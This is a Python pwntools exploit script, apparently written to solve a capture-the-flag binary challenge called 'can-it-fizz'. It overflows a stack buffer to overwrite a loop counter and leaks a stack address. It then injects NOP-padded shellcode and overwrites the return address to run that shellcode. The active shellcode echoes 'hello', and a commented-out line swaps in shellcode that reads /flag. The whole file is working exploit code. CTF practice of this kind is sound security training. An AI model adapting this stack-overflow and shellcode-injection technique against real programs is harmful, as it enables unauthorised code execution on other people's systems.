from pwn import *

if args.LOCAL:
    context.binary = elf = ELF('./can-it-fizz', checksec = False)
else:
    context.binary = elf = ELF('/challenge/can-it-fizz', checksec = False)

# io = gdb.debug('./can-it-fizz', '''
#                b *challenge + 366
#                continue
#                ''')
io = elf.process()

counter_magic = 4294967295 # NOTE: cmp with sign, so -1 can be used for control loop counter
counter_with_stack_address_magic = 4
buffer_couter_offset = 0x40 # compute from gdb

io.send(b'A' * buffer_couter_offset + p32(counter_with_stack_address_magic)) # trigger buff[11] store with stack address

payload_leak_stack_addr = b'A' * buffer_couter_offset + p32(counter_magic)
io.send(payload_leak_stack_addr)
io.recvuntil(payload_leak_stack_addr)
stack_addr = u64(io.recvline(keepends = False).ljust(8, b'\x00'))
print(f'[=] stack address: {hex(stack_addr)}')

stack_buffer_offset = 0x38 # compute from gdb
sc = asm(shellcraft.echo('hello'))
# sc = asm(shellcraft.cat('/flag'))

# printf("You entered: %s\n", (const char *)&buf[2] + 4);
# BYTE4(buf[2]) = 0;
# NOTE: so first bytes will be overwrite
payload = b'\x90' + sc + b'\x90' * (buffer_couter_offset - len(sc) - 1) + p32(16) + p64(stack_addr + 0x50) * 2 + b'B' * 0x10 + p64(stack_addr - stack_buffer_offset + 1)

io.send(payload)

io.interactive()
